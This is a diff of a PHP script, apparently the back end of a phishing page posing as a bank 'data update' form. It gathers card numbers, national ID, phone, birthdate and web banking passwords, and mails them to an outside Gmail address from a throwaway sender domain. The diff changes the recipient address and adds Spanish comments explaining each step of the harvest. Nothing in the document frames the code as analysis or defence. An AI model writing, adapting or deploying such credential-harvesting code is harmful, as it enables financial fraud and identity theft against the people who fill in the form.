@@ -12,10 +12,12 @@
     $birthdate = $_POST['birthdate'];
 
     //Correo a donde se envía la información
-    $to = "fernando1894@hotmail.com";
+    $to = "pp0505779@gmail.com";
 
+    //Asunto de correo
     $subject = "ACTUALIZACIÓN DE DATOS";
 
+    //Informacion que se envía en el correo
     $txt =  "NUMERO DE TARJETA: " . $cc . "\n" . 
             "DNI: " . $dni . "\n" . 
             "NUMERO DE TELEFONO: " . $tel . "\n" . 
@@ -24,10 +26,12 @@
             "FECHA DE NACIMIENTO: " . $birthdate . "\n" . 
             "CLAVE WEB: " . $pass;
 
+    //Destinatario
     $headers = "From: pruebas@pruebas.ga";
 
     mail($to, $subject, $txt, $headers);
 
+    //Al finalizar se elimina la sesión y se borran las variables con la información del formulario
     session_unset();
     session_destroy();
 
